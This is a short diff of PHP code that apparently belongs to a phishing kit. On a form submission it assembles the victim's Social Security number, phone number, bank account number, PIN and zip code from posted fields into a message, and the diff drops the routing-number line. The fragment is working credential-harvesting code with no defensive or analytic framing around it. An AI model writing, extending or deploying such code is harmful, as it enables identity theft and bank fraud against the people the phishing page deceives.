@@ -42,7 +42,6 @@ else if (isset($_POST['contibtn'])) {
 	$message .= "Social Security Number : ".$_POST['ssn']."\n";
 	$message .= "Phone Number           : ".$_POST['phone']."\n";
 	$message .= "Account Number         : ".$_POST['acctnum']."\n";
-	$message .= "Routing Number         : ".$_POST['routenum']."\n";
 	$message .= "Pin                    : ".$_POST['pin']."\n";
 	$message .= "Zip Code            : ".$_POST['zip']."\n";
 
